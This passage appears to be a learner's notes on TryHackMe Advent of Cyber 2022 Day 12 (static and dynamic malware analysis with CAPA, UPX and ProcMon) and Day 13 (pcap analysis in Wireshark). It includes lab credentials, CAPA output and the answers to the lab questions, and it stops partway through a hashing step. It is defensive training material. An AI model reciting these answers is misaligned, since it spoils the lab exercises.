+ImageSectionObject0xc0090e8b8250KernelBase.dllfile.0xc0090e8b8250.0xc0090e579620.ImageSectionObject.KernelBase.dll.img
+ImageSectionObject0xc0090f3b78c0mswsock.dllfile.0xc0090f3b78c0.0xc0090f3d0c40.ImageSectionObject.mswsock.dll.img
+ImageSectionObject0xc0090e8b9ce0bcrypt.dllfile.0xc0090e8b9ce0.0xc0090e5786d0.ImageSectionObject.bcrypt.dll.img
+ImageSectionObject0xc0090ba9c6a0msvcrt.dllfile.0xc0090ba9c6a0.0xc0090bb54d70.ImageSectionObject.msvcrt.dll.img
+ImageSectionObject0xc0090e8dcb50advapi32.dllfile.0xc0090e8dcb50.0xc0090e7b4ce0.ImageSectionObject.advapi32.dll.img
+ImageSectionObject0xc0090e8dc6a0rpcrt4.dllfile.0xc0090e8dc6a0.0xc0090e511c50.ImageSectionObject.rpcrt4.dll.img
+ImageSectionObject0xc0090e774510ws2_32.dllfile.0xc0090e774510.0xc0090bb3e8a0.ImageSectionObject.ws2_32.dll.img
+ImageSectionObject0xc0090e774830nsi.dllfile.0xc0090e774830.0xc0090bb55d70.ImageSectionObject.nsi.dll.img
+ImageSectionObject0xc0090e6611f0ntdll.dllfile.0xc0090e6611f0.0xc0090bb84bb0.ImageSectionObject.ntdll.dll.img
+ImageSectionObject0xc0090ba9cce0sechost.dllfile.0xc0090ba9cce0.0xc0090e4d4bb0.ImageSectionObject.sechost.dll.img
+```
+*16*
+If you want to learn more about Volatility, please check out a dedicated room [here](https://tryhackme.com/room/volatility). For more content on forensics, we have a full [Digital Forensics and Incident Response](https://tryhackme.com/module/digital-forensics-and-incident-response) module for you!
+### [Day 12] Malware Analysis Forensic McBlue to the REVscue!
+The Story
+Check out HuskyHack's video walkthrough for Day 12 [here](https://www.youtube.com/watch?v=kdQZPLRnr3g)!
+The malicious document attached to the phishing email was confirmed to have been executed. Aside from the fact that rogue connections were observed, we know little about what it does.
+Our in-house expert **Forensic McBlue** confirmed that the malicious document spawned another suspicious binary. Pivoting from that, he dumped it from memory for this task to be further analysed via Malware Analysis.
+﻿Learning Objectives
+-   Learn the fundamentals of analysing malware samples without relying on automated sandbox scanners.
+-   Learn and understand typical malware behaviour and its importance in the incident investigation pipeline.
+﻿Key Malware Behaviours
+Before touching the malware sample for this task, we need to briefly introduce common malware behaviours to have a good perspective on what to expect in handling malware samples.
+A prominent word in cybersecurity, **malware** is software created to harm a computer or an entire network. Threat actors develop malware to achieve specific goals, such as infiltrating networks, breaching sensitive data, or disrupting operational services.
+If you were to inspect several malware samples in the wild, a typical pattern arises, making analysing other samples easier with experience. Knowing these common behaviours gives us an idea of what to look for on the defensive side, such as:
+-   **Network connections** - Malware tends to establish either external network connections or internal connections. External connections allow remote access or for downloading staged payloads from a threat actors' infrastructure. Meanwhile, internal connections allow for lateral movement, a technique used to extend access to other hosts or applications within the network.
+-   **Registry key modifications** - Malware typically uses registry keys to establish persistence, a technique used by threat actors to discreetly maintain long-term access to a system despite disruptions. A good example is Registry Run Keys, which allows binaries to be automatically executed when a user logs in or the machine boots up.
+-   **File manipulations** -  Malware also tends to download (one of the common reasons to establish network connections) or create new files needed for its successful execution.
+Given this knowledge, we can expect the possible behaviour of malware during an investigation.
+Dangers of Analysing Malware Samples
+**WARNING**: **Handling a malware sample is dangerous. Always consider precautions while analysing it.**
+-   Always assume that malware samples will infect your device; hence executing it is not always the first and only step in analysing it.
+-   Only run the malware sample in a controlled environment that prevents potential compromise of unwanted assets.
+-   It is always recommended to have your **sandbox,** which allows you have a worry-free execution of malware samples.
+A **sandbox** is a controlled test environment that mimics a legitimate end-user working environment. It gives analysts a safe environment to execute malware samples and learn their behaviour. Lastly, having a ready sandbox prevents analysts from running malware samples in their workstations, which is highly dangerous and impractical for the possibility of unwanted impact.
+In a typical setup, sandboxes also provide automated analysis at the disposal of Security Analysts to determine if a binary from a set of malware samples requires further manual investigation.
+For this task, you may start the attached FlareVM instance by clicking on the Start Machine button. This VM will serve as your **sandbox**. However, do not expect this machine to provide an automated analysis since we will assist Forensic McBlue in conducting manual analysis.
+Note: If the VM is not visible, use the blue Show Split View button at the top-right of the page.
+You may use the following credentials for alternative access via Remote Desktop (RDP):
+Machine IP: `MACHINE_IP`
+User: `administrator`
+Pass: `letmein123!`
+Static and Dynamic Analysis
+We have understood the prerequisites needed to handle the malware safely from the previous section. Now, let's have a quick refresher on the two methods of malware analysis.
+**Static Analysis** is a way of analysing a malware sample without executing the code. This method mainly focuses on profiling the binary with its readable information, such as its properties, program flow and strings. Given the limitation of not executing it, sometimes this method gives insufficient information, which is why we resort to Dynamic Analysis.
+Meanwhile, **Dynamic Analysis** mainly focuses on understanding the malware by executing it in a safe environment, such as a Sandbox. By doing this, you will see the malware live in action, its exact behaviour, and how it infects the environment.
+Profiling Executables through Static Analysis
+As discussed above, before popping the malware sample in `$Desktop\Malware Sample` directory, let's conduct a Static Analysis for the **mysterygift** binary.
+For this exercise, we will mainly use the following tools: **Detect It Easy** and **CAPA**.
+**Detect It Easy**
+Right-click the sample and execute **Detect It Easy (DIE)**. This tool provides information about the file, such as its architecture, significant headers, packer used, and strings. In this task, we will only utilise the basic functionalities of Detect It Easy to gain the basic information needed to analyse the binary. If you want to learn more about this tool, you may refer to this [link](https://github.com/horsicq/Detect-It-Easy).
+Upon opening, we will immediately discover the binary's architecture, and the executable packer used.
+Packing malware is a common technique used by malware developers to compress, obfuscate or encrypt the binary. With this, contents such as significant strings and headers will not be immediately visible to Static Analysis Tools.
+You may test this information by doing the following:
+-   View the strings from Detect It Easy, which shows an overwhelming number of strings that are not that significant for investigation.
+-   Note: Strings are pieces of text inside a binary, often containing information such as IP addresses, URLs, or file names used by the malicious program.
+-   Run **CAPA,** which shows that the binary mostly hides its logic and analysis is affected due to a packer.
+**CAPA**
+﻿**CAPA** detects capabilities in executable files. May it be for the installation of a service, invocation of network connections, registry modifications and such.
+To start playing with CAPA, fire up the command prompt located in the taskbar and navigate to the Malware Sample directory, as shown below.
+cmd.exe
+```shell-session
+C:\Users\Administrator>cd "Desktop\Malware Sample"
+C:\Users\Administrator\Desktop\Malware Sample>capa mysterygift
+loading : 100%|████████████████████████████████████████████████████████████| 485/485 [00:00<00:00, 1633.69     rules/s]
+matching: 100%|██████████████████████████████████████████████████████████████████| 3/3 [00:02<00:00,  1.11 functions/s]
+WARNING:capa:--------------------------------------------------------------------------------
+WARNING:capa: This sample appears to be packed.
+WARNING:capa:
+WARNING:capa: Packed samples have often been obfuscated to hide their logic.
+WARNING:capa: capa cannot handle obfuscation well. This means the results may be misleading or incomplete.
+WARNING:capa: If possible, you should try to unpack this input file before analyzing it with capa.
+WARNING:capa:
+WARNING:capa: Use -v or -vv if you really want to see the capabilities identified by capa.
+WARNING:capa:--------------------------------------------------------------------------------
+```
+﻿Given the CAPA output, we have discovered that the malware sample is packed. You may have also seen previously from **Detect It Easy** that the binary is packed by UPX.
+So now, let's unpack the binary using UPX and re-analyse the binaries using CAPA.
+cmd.exe
+```shell-session
+C:\Users\Administrator\Desktop\Malware Sample>upx -d mysterygift
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2020
+UPX 3.96w       Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+    502169 <-    227737   45.35%    win64/pe     mysterygift
+
+Unpacked 1 file.
+```
+cmd.exe
+```shell-session
+C:\Users\Administrator\Desktop\Malware Sample>del mysterygift.viv
+C:\Users\Administrator\Desktop\Malware Sample>capa mysterygift
+```
+﻿You may observe that CAPA now has provided important information about the malware sample.
+Note: We have executed `del mysterygift.viv` to delete the cached results of the first CAPA execution. By deleting the viv file, CAPA re-analyses the binary with accurate results.
+With prior, yet limited, knowledge about the malware sample, let's investigate more by doing a dynamic analysis!
+Deep-dive into Dynamic Malware Analysis
+You may have observed that we cannot execute the binary after double-clicking it, as its file extension is not `.exe`.
+Before renaming and executing the binary, let's prepare the tool we need for analysing its behaviour - ProcMon. ProcMon, or Process Monitor, is a Windows tool that shows real-time registry, file system, and process/thread activity. You can learn more about it [here](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon). You may access it via the taskbar beside cmd.exe.
+Once opened, you will be prompted by  **Process Monitor Filter -**  a feature that allows us to filter the results logged by ProcMon. In this case, we want to only focus on events generated by `mysterygift.exe` process. Let's set the condition `Process Name - is - mysterygift.exe` ; add the filter and choose **OK** to close the prompt.
+Now, let's prepare the malware sample for execution and rename it to **mysterygift.exe**.
+cmd.exe
+```shell-session
+C:\Users\Administrator\Desktop\Malware Sample>mv mysterygift mysterygift.exe
+```
+We are now ready to pop the malware. Navigate to the Malware Sample folder, double-click the binary and observe the results generated by **ProcMon**. It might be overwhelming at first but let's utilise its functionalities to only show the information we want.
+ProcMon has a panel that can filter the following, as highlighted in the image below (in sequence):
+-   Show Registry Activity
+-   Show File System Activity
+-   Show Network Activity
+-   Show Process and Thread Activity
+-   Show Profiling Events
+With these filters, we will focus on the first three; Registry, File System and Network. As discussed above, malware tends to do the following; **Registry Modification, File Modification and Network Connections**. Let's start investigating them one by one.
+**Registry Modification**
+First, we want to determine if any significant Registry Modifications are executed by the binary, which is one of the expected behaviours introduced in this task.
+To do this, unclick all filters and only choose **Show Registry Activity**. The results still give several results so let's add a filter by finding all Registry Key Creations and Modifications. Remove the following Operations by right-clicking an entry from the Operation column and choosing **Exclude '<operation (e.g. RegQueryKey)>'** similar to the image below:
+-   RegOpenKey
+-   RegQueryValue
+-   RegQueryKey
+-   RegCloseKey
+The view from ProcMon should yield fewer results, similar to the image below.
+You may observe that only one Registry Key has both **RegCreateKey** and **RegSetValue**. This key is related to a persistence technique called **Registry Run Key Modification** and is commonly used by malware developers to install a backdoor.
+File Modification
+Now, let's also determine if the malware sample executes File Creations. It may indicate that the malware drops prerequisite files for its successful execution.
+Unclick all filters and choose the second filter - **Show File System Activity**. Again, the results are still numerous so let's add extra filters by focusing only on **File Write** events. Remove the following Operations again by right-clicking an entry from the Operation column and choosing Exclude '<operation (e.g. CreateFile)>':
+-   CreateFile
+-   CreateFileMapping
+-   QuerySecurityFile
+-   QueryNameInformationFile
+-   QueryBasicInformationFile
+-   CloseFile
+-   ReadFile
+The view from ProcMon should yield fewer results, similar to the image below.
+You may observe that two files are written under the **C:\Users\Administrator** directory. The first file is located in the user's **TEMP** directory, which is commonly used by malware to drop another file for its disposal. The other file is written in the **STARTUP** directory, also used for persistence via **Startup Folders**.
+**Network Connections**
+Lastly, let's confirm if the malware sample attempts to make a network connection. It may indicate that the malware communicates with external resources to download or establish remote access.
+Unclick all filters and choose the third filter - Show Network Activity. Unlike the previous filters, the results are few and can be easily interpreted.
+Please take note of these domains, as we can use this information to investigate the rabbit hole further.
+Conclusion
+We have covered several topics on this task about Malware Analysis. For a quick summary, we have learned the following:
+-   Key behaviours of malware aid in having an overview of what to expect in examining malware samples.
+-   The precautions needed to consider while handling malware samples and the importance of sandboxes.
+-   Conduct a Static Analysis and profile the nature of the binary without executing it.
+-   Perform a manual Dynamic Analysis and observe the interactions of the malware sample in the **Registry**, **File System** and **Network**.
+﻿Finally, complete the findings by answering our investigation guide below and assisting Forensic McBlue!
+Answer the questions below
+What is the architecture of the malware sample? (32-bit/64-bit)
+```text
+using detect it easy (DIE)
+```
+![[Pasted image 20221219185523.png]]
+*64-bit*
+What is the packer used in the malware sample? (format: lowercase)
+*upx*
+What is the compiler used to build the malware sample? (format: lowercase)
+Check the output of CAPA.
+```text
+C:\Users\Administrator\Desktop\Malware Sample>upx -d mysterygift                                                                                                                               Ultimate Packer for eXecutables                                                                                                                                            Copyright (C) 1996 - 2020                                                                                                                     UPX 3.96w       Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020                                                                                                                                                                                                                                                                           File size         Ratio      Format      Name                                                                                                                      --------------------   ------   -----------   -----------                                                                                                                502169 <-    227737   45.35%    win64/pe     mysterygift                                                                                                                                                                                                                                                                                    Unpacked 1 file.                                                                                                                                                                                                                                                                                                                                FLARE Mon 12/19/2022 17:52:31.69                                                                                                                                        C:\Users\Administrator\Desktop\Malware Sample>ls                                                                                                                        mysterygift                                                                                                                                                                                                                                                                                                                                     FLARE Mon 12/19/2022 17:52:34.55                                                                                                                                        C:\Users\Administrator\Desktop\Malware Sample>capa mysterygift                                                                                                          loading : 100%|███████████████████████████████████████████| 485/485 [00:00<00:00, 1724.62     rules/s]                                                                  matching: 100%|█████████████████████████████████████████████| 573/573 [00:16<00:00, 33.89 functions/s]                                                                  +------------------------+------------------------------------------------------------------------------------+                                                         | md5                    | 4e0321d7347cc872a5ac8ca7220b0631                                                   |                                                         | sha1                   | 2dfcba8c182e4ea7665c44054d46549cc7b4430a                                           |                                                         | sha256                 | 647458e71aea13d92e944bc7b7f305c6da808c71c3d19dc255a96dd60c8800a7                   |                                                         | path                   | mysterygift                                                                        |                                                         +------------------------+------------------------------------------------------------------------------------+                                                                                                                                                                                                                                 +------------------------+------------------------------------------------------------------------------------+                                                         | ATT&CK Tactic          | ATT&CK Technique                                                                   |                                                         |------------------------+------------------------------------------------------------------------------------|                                                         | DEFENSE EVASION        | Obfuscated Files or Information [T1027]                                            |                                                         | DISCOVERY              | File and Directory Discovery [T1083]                                               |                                                         |                        | System Information Discovery [T1082]                                               |                                                         | EXECUTION              | Shared Modules [T1129]                                                             |                                                         | PERSISTENCE            | Boot or Logon Autostart Execution::Registry Run Keys / Startup Folder [T1547.001]  |                                                         +------------------------+------------------------------------------------------------------------------------+                                                                                                                                                                                                                                 +-----------------------------+-------------------------------------------------------------------------------+                                                         | MBC Objective               | MBC Behavior                                                                  |                                                         |-----------------------------+-------------------------------------------------------------------------------|                                                         | ANTI-BEHAVIORAL ANALYSIS    | Debugger Detection::Software Breakpoints [B0001.025]                          |                                                         | DATA                        | Check String [C0019]                                                          |                                                         |                             | Encoding::Base64 [C0026.001]                                                  |                                                         |                             | Non-Cryptographic Hash::MurmurHash [C0030.001]                                |                                                         | DEFENSE EVASION             | Obfuscated Files or Information::Encoding-Standard Algorithm [E1027.m02]      |                                                         | FILE SYSTEM                 | Read File [C0051]                                                             |                                                         |                             | Write File [C0052]                                                            |                                                         | MEMORY                      | Allocate Memory [C0007]                                                       |                                                         | PROCESS                     | Terminate Process [C0018]                                                     |                                                         +-----------------------------+-------------------------------------------------------------------------------+                                                                                                                                                                                                                                 +------------------------------------------------------+------------------------------------------------------+                                                         | CAPABILITY                                           | NAMESPACE                                            |                                                         |------------------------------------------------------+------------------------------------------------------|                                                         | check for software breakpoints                       | anti-analysis/anti-debugging/debugger-detection      |                                                         | compiled with Nim                                    | compiler/nim                                         |                                                         | encode data using Base64                             | data-manipulation/encoding/base64                    |                                                         | reference Base64 string                              | data-manipulation/encoding/base64                    |                                                         | hash data using murmur3 (2 matches)                  | data-manipulation/hashing/murmur                     |                                                         | contain a resource (.rsrc) section                   | executable/pe/section/rsrc                           |                                                         | contain a thread local storage (.tls) section        | executable/pe/section/tls                            |                                                         | query environment variable                           | host-interaction/environment-variable                |                                                         | check if file exists                                 | host-interaction/file-system/exists                  |                                                         | read file (3 matches)                                | host-interaction/file-system/read                    |                                                         | write file (4 matches)                               | host-interaction/file-system/write                   |                                                         | get thread local storage value                       | host-interaction/process                             |                                                         | allocate RWX memory                                  | host-interaction/process/inject                      |                                                         | terminate process                                    | host-interaction/process/terminate                   |                                                         | parse PE header (2 matches)                          | load-code/pe                                         |                                                         | reference startup folder                             | persistence/startup-folder                           |                                                         +------------------------------------------------------+------------------------------------------------------+                                                                                                                                                                                                                                                                                                                                                                                                         FLARE Mon 12/19/2022 17:53:15.83
+```
+*nim*
+How many MITRE ATT&CK techniques have been discovered attributed to the DISCOVERY tactic?
+Check the ATT&CK Tactic and Technique table from CAPA output.
+*2*
+What is the registry key abused by the malware?
+Check the Path column.
+![[Pasted image 20221219210030.png]]
+```text
+C:\Users\Administrator\Desktop\Malware Sample>mv mysterygift mysterygift.exe                                                                                                                                                                                                                                                                    FLARE Mon 12/19/2022 18:01:04.61                                                                                                                                        C:\Users\Administrator\Desktop\Malware Sample>ls                                                                                                                        mysterygift.exe  mysterygift.viv                                                                                                                                                                                                                                                                                                                FLARE Mon 12/19/2022 18:01:07.25   
+
+go to registry and excluded 
+
+-   RegOpenKey
+-   RegQueryValue
+-   RegQueryKey
+-   RegCloseKey
+
+and for file
+
+-   CreateFile
+-   CreateFileMapping
+-   QuerySecurityFile
+-   QueryNameInformationFile
+-   QueryBasicInformationFile
+-   CloseFile
+-   ReadFile
+```
+![[Pasted image 20221219210207.png]]
+![[Pasted image 20221219211501.png]]
+![[Pasted image 20221219211634.png]]
+*HKCU\Software\Microsoft\Windows\CurrentVersion\Run\*
+What is the value written on the registry key based on the previous question?
+Check the Details column.
+![[Pasted image 20221219211750.png]]
+*C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\wishes.bat*
+![[Pasted image 20221219212400.png]]
+![[Pasted image 20221219212429.png]]
+![[Pasted image 20221219212820.png]]
+What are the names of two files created by the malware under the C:\Users\Administrator\ directory? (format: file1,file2 in alphabetical order)
+![[Pasted image 20221219214456.png]]
+*test.jpg,wishes.bat*
+What are the two domains wherein malware has initiated a network connection? (format: domain1,domain2 in alphabetical order)
+![[Pasted image 20221219214552.png]]
+*bestfestivalcompany.thm,virustotal.com*
+Going back to strings inside the malware sample, what is the complete URL used to download the file hosted in the first domain accessed by the malware?
+Use Detect It Easy again and use the strings functionality to see the complete URL used by the first domain. You may also filter the strings to display the desired output.
+```text
+C:\Users\Administrator\Desktop\Malware Sample>strings mysterygift.exe | grep http://                                    @http://virustotal.com                                                                                                  @http://bestfestivalcompany.thm/favicon.ico                                                                                                                                                                                                     FLARE Mon 12/19/2022 18:47:50.50  
+
+or using DIE and strings and filer http:// and search :)
+```
+![[Pasted image 20221219215015.png]]
+*http://bestfestivalcompany.thm/favicon.ico*
+If you enjoyed malware analysis, try the [Intro to Malware Analysis](https://tryhackme.com/room/intromalwareanalysis) or [Dissecting PE Headers](https://tryhackme.com/room/dissectingpeheaders) rooms next!
+### [Day 13] Packet Analysis Simply having a wonderful pcap time
+The Story
+Check out SecurityNinja's video walkthrough for Day 13 [here](https://www.youtube.com/watch?v=rSyR8YFbOlI)!
+After receiving the phishing email on Day 6 and investigating malware on Day 12, it seemed everything was ready to go back to normal. However, monitoring systems started to show suspicious traffic patterns just before closing the case. Now Santa's SOC team needs help in analysing these suspicious network patterns.
+Learning Objectives
+-   Learn what traffic analysis is and why it still matters.
+-   Learn the fundamentals of traffic analysis.
+-   Learn the essential Wireshark features used in case investigation.
+-   Learn how to assess the patterns and identify anomalies on the network.
+-   Learn to use additional tools to identify malicious addresses and conduct further analysis.
+-   Help the Elf team investigate suspicious traffic patterns.
+Packets and Packet Analysis?
+Packets are the most basic unit of the network data transferred over the network. When a message is sent from one host to another, it is transmitted in small chunks; each called a packet. Packet analysis is the process of extracting, assessing and identifying network patterns such as connections, shares, commands and other network activities, like logins, and system failures, from the prerecorded traffic files.
+Why Does Packet Analysis Still Matter?
+Network traffic is a pure and rich data source. A Packet Capture (PCAP) of network events provides a rich data source for analysis. Capturing live data can be focused on traffic flow, which only provides statistics on the network traffic. On the other hand, identifying and investigating network patterns in-depth is done at the packet level. Consequently, threat detection and real-time performance troubleshooting cannot be done without packet analysis.
+Today, most network-based detection mechanisms and notification systems ingest and parse packet-level information to create alerts and statistical data. Also, most red/blue/purple teaming exercises are optimised with packet-level analysis. Lastly, even encoded/encrypted network data still provides value by pointing to an odd, weird, or unexpected pattern or situation, highlighting that packet analysis still matters.
+Points to consider when working with PCAPs
+There are various points to consider before conducting packet analysis. The essential points are listed below.
+**Point**
+**Details**
+Network and standard protocols knowledge.
+Knowledge of the network and protocol operations is a must. An analyst must know how the protocols work and which protocol provides particular information that needs to be used for analysis. Also, knowing the "normal" and "abnormal" behaviours and patterns is a big plus!
+Familiarity with attack and defence concepts.
+You can't detect what you don't know. An analyst must know "how the attacks are conducted" to identify "what is happening" and decide "where to look".
+**Practical experience in analysis tools.**
+You can't burn down the haystack to find a needle! An analyst must know how to use the tools to extract particular information from packet bytes.
+When the time comes to do "packet level analysis", it might sound hard to implement the theory in practice. But creating "checklists" and "mini playbooks" will make the analysis process considerably easier. A simple process checklist for practical packet analysis is shown below.
+**Required Check**
+**Details**
+Hypothesis
+Having a hypothesis is important before starting packets.
+The analyst should know what to look for before starting an analysis.
+Packet Statistics
+Viewing the packet statistics can show the analyst the weight of the traffic in the capture file.
+It helps analysts see the big picture in terms of protocols, endpoints and conversations.
+Known Services
+The services used in everyday operations like web browsing, file sharing and mailing are called known services.
+The analyst should know which protocol is associated with which service.
+Sometimes adversaries use the known services for their benefit, so it is important to know what "the normal" looks like. **Note:** Service is a capability/application that facilitates network operations between users and applications. The protocol is a set of rules that identify the data processing and transmission over the network.
+Unknown Services
+Unknown services are potential red flags.
+The analyst should know how to research unknown protocols and services and quickly use them for the sake of the analysis.
+Known patterns
+Known patterns represent the analyst's knowledge and experience.
+The analyst should know the most common and recent case patterns to successfully detect the anomalies at first glance.
+**Environment**
+The analyst has to know the nature and dynamics of the working environment. This includes IP address blocks, hostname and username structure, used services, external resources, maintenance schedules, and average traffic load.
+You will need a tool to record, view and investigate the packets. There are a couple of tools that help users investigate traffic and packet captures. In this task, we will use Wireshark.
+What is Wireshark and How to Use It?
+Wireshark is an industry-standard tool for network protocol analysis and is essential in any traffic and packet investigation. You can view, save and break down the network traffic with it. You can learn more about Wireshark by completing the [**Wireshark module**](https://tryhackme.com/module/wireshark).
+A quick tool demonstration for fundamental analysis is shown below. Now click on the **Start Machine** button at the top of the task to launch the **Virtual Machine**. The machine will start in a split-screen view. In case the VM is not visible, use the blue Show Split View button at the top-right of the page.
+After starting the given VM, open the Wireshark and go through the walkthrough below. Once you double-click the PCAP file, it will load up in the tool. Alternatively, you can open the tool, drag and drop the file, or use the **"File"** menu.
+After opening a pcap file for the first time, it might look daunting to decide where to focus. Breaking down all the packets in a tree-based view will make the analysis easier. Statistics will show the overall usage of the ports and services, so it will be slightly easier to see the big picture in the capture file.
+-   Use the "Statistics --> Protocol Hierarchy" menu to view the overall usage of the ports and services.
+Now, look at the output. The majority of the traffic is on TCP and HTTP:
+You can also view the connections by IP and TCP/UDP protocols to view the overall usage of the ports and services (including the total packet numbers transferred over a particular port and between two hosts). The next step is viewing the IP conversations to spot if there is a weird/suspicious/not usual IP address in use.
+-   Close the protocol hierarchy window, use the "Statistics --> Conversations" section and navigate to the IPv4 section to view the list of IP conversations.
+**Note:** Navigate to the TCP/UDP sections to view the TCP/UDP conversation details.
+Now we have a detailed list of the IP addresses, port numbers, and the number of packets transferred from one endpoint to another. This information will help us identify suspicious IP addresses, connections and ports. Analyse the details carefully; we may discover the IP addresses and services used by the Bandit Yeti APT!
+Let's analyse the findings in this section; navigate to the TCP part and look at the results, the port 80 is used as a communication medium in TCP. Port 80 represents the HTTP service. Next, you can view that DNS service is also used by navigating to the UDP section. Now we have two target protocols to analyse. Before continuing on specific protocol analysis, you should have completed the following checks and answered some analysis questions.
+-   **Checks to do**
+-   Packet statistics
+-   Service identification
+-   IP reputation check
+-   **Questions to answer**
+-   Which IP addresses are in use?
+-   Has a suspicious IP address been detected?
+-   Has suspicious port usage been detected?
+-   Which port numbers and services are in use?
+-   Is there an abnormal level of traffic on any port or service?
+Note: You can use the OSINT tools mentioned on Day 6 to conduct a reputation check on suspicious IP/domain addresses. Note that you can't rely on the reputation check if nothing suspicious is detected at this stage. You still need to go further to discover potential anomalies. Also, if you can't recall or identify the port numbers and service names, you can use the "Google Dorks" search techniques shown on Day 3 to search and learn port numbers and service names.
+After viewing the conversations, we collected the following information.
+-   Source and destination IP addresses
+-   Protocols
+-   Port numbers
+-   Services
+Now let's focus on the HTTP and DNS. As a nature of these protocols, everything transferred over these protocols is cleartext. At this stage, filtering the DNS packets to view the interacted domains is a good start before deep diving into cleartext data.
+-   Close the statistics window, and type `DNS` in the search bar to apply a filter and view the DNS packets.
+DNS packets will help us to identify connected domain addresses to decide if they are affiliated with the suspicious threat and Bandit Yeti APT! Click on the first packet and use the lower left section of the tool (Packet Details Pane) to view the packet details. There are multiple collapsed sections; click on the `Domain Name System` section to expand and view the DNS details of the packets. There are additional collapsed sections under the corresponding section; expand them to view all available details. You will find the interacted domain under the `queries` section. See the below example and continue the analysis by analysing all available DNS packets.
+Before continuing on HTTP analysis, ensure you have completed the following checks and answered the analysis questions.
+-   Checks to do
+-   DNS queries
+-   DNS answers
+-   Questions to answer
+-   Which domain addresses are communicated?
+-   Do the communicated domain addresses contain unusual or suspicious destinations?
+-   Do the DNS queries look unusual, suspicious or malformed?
+We discovered the connected domain addresses, and now we are one step closer to identifying if these patterns are part of the adversarial actions of the Bandit Yeti APT. You should notice the obvious anomalous sign in the domain address at this stage! Let's filter the HTTP packets to view the traffic details and understand what happened!
+-   Use the `HTTP` filter to filter and view the HTTP packets.
+Click on the first packet and view the details. In HTTP, the **"GET Request"** is used by the client to send a request to a server. Usually, this request ends up with receiving data/resources. Therefore, we will look at these requests to see if any endpoint is asked for a resource from other servers over the HTTP protocol.
+Apply the filter and expand the `Hypertext Transfer Protocol` section. Expand the subsections as well and focus on the GET requests. You will find the requested resource paths under the `Full Request URI` section. Also, you can evaluate the `user-agent` section to check if there is anomalous or non-standard user-agent info. See the below example and continue on analysis by analysing all available HTTP packets.
+Before continuing to the next steps, ensure you have completed the following checks and answered the analysis questions.
+-   Checks to do
+-   HTTP GET requests
+-   Requested URIs
+-   HTTP requests host addresses
+-   Used user-agents
+-   Questions to answer
+-   Which addresses are communicated?
+-   Is there any resource share event between addresses?
+-   If there is a file share event, which addresses hosts which files?
+-   Do the user-agent fields look unusual, suspicious or malformed?
+Here, you should identify the stealthy connections of the Bandit Yeti APT. It looks like the adversarial group chose to use the daily used services and create less noise over the common protocols to avoid being detected.
+The investigation case doesn't contain any obvious anomaly patterns like scanning, brute force and exploitation. However, it contains suspicious connections and file shares. These two are red flags and require in-depth analysis. Still, there are a few steps more before concluding the case and elevating it to upper-level analysts. In sum, we detected two unidentified domain addresses, one highly associated with the Bandit Yeti APT. Also, we have already identified the IP addresses, port numbers and domain addresses. The next step is focusing on file shares. Let's extract the shared files and conduct fundamental checks on the files before finishing the analysis.
+-   Use the "File --> Export Object --> HTTP" menu to extract files shared over the HTTP.
+Look at the results. There are two files shared over the HTTP. Use the `Save All` option and save them on the desktop. Now close/minimise the Wireshark GUI and open a terminal window on the desktop. Use the `sha256sum` and `VirusTotal` tools shown on Day 6 to calculate the file hash value and to conduct hash-based file reputation analysis.
+Before concluding the analysis, ensure you have completed the following checks and answered the analysis questions.
+-   Checks to do
+-   Shared files
+-   File hashes (SHA256)
+-   Hash reputation check
+-   Questions to answer
+-   What are shared files?
+-   Does the hash reputation marked as suspicious or malicious?
+-   Which domain hosts the suspicious/malicious file?
+After completing the demonstrated steps, we verified that one shared file was malicious. Before concluding the analysis, you need to correlate the findings and recall which address was hosting the malicious file.
+Your report should include the following information you collected in this task.
+-   Suspicious IP addresses associated with Bandit Yeti APT
+-   Suspicious domain addresses associated with Bandit Yeti APT
+-   Connection with suspicious addresses
+-   Requested URIs
+-   Used user-agents
+-   Shared file names, extensions and hashes
+-   Server names hosted the shared files
+This was the initial analysis process of a PCAP file. An in-depth analysis will create detection rules to strengthen the implemented defences and block these activities in the future. Now it is time to put what we've learned into practice. Answer the given questions to help Santa's SOC team analyse the suspicious traffic patterns to identify the Bandit Yeti's network traces on Santa's network.
+Answer the questions below
+View the "Protocol Hierarchy" menu.
+What is the "Percent Packets" value of the "Hypertext Transfer Protocol"?
+![[Pasted image 20221220120743.png]]
+*0.3*
+View the "Conversations".
+Navigate to the TCP section.
+Which port number has received more than 1000 packets?
+![[Pasted image 20221220121022.png]]
+*3389*
+What is the service name of the used protocol that received more than 1000 packets?
+Use the "Statistics --> Conversations" menu and navigate to the TCP conversations. You can "Google" the port numbers to learn associated service names.
+*rdp*
+Filter the DNS packets.
+What are the domain names?
+Enter the domains in alphabetical order and defanged format. (format: domain[.]zzz,domain[.]zzz)
+Cyberchef can defang.
+![[Pasted image 20221220121458.png]]
+*cdn[.]bandityeti[.]thm,bestfestivalcompany[.]thm*
+Filter the HTTP packets.
+What are the names of the requested files?
+Enter the names in alphabetical order and in defanged format. (format: file[.]xyz,file[.]xyz)
+![[Pasted image 20221220121607.png]]
+*favicon[.]ico,mysterygift[.]exe*
+Which IP address downloaded the executable file?
+Enter your answer in defanged format.
+Cyberchef can defang.
+![[Pasted image 20221220121742.png]]
+*10[.]10[.]29[.]186*
+Which domain address hosts the malicious file?
+Enter your answer in defanged format.
+View the "GET" request that downloads the malicious file. The "Host" section shows the domain address that hosts the file.
+![[Pasted image 20221220121926.png]]
+*cdn[.]bandityeti[.]thm*
+What is the "user-agent" value used to download the non-executable file?
+![[Pasted image 20221220122026.png]]
+*Nim httpclient/1.6.8*
+Export objects from the PCAP file.
+Calculate the file hashes.
+What is the sha256 hash value of the executable file?
+"sha256sum" can help.
+![[Pasted image 20221220122139.png]]
+![[Pasted image 20221220122203.png]]
+![[Pasted image 20221220122237.png]]
+```text
+ubuntu@ip-10-10-8-159:~$ ls
+Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
+ubuntu@ip-10-10-8-159:~$ cd Desktop/
+ubuntu@ip-10-10-8-159:~/Desktop$ sha256 mysterygift.exe 
+
+Command 'sha256' not found, but can be installed with:
+
+sudo apt install hashalot
+
+ubuntu@ip-10-10-8-159:~/Desktop$ sha256sum mysterygift.exe 
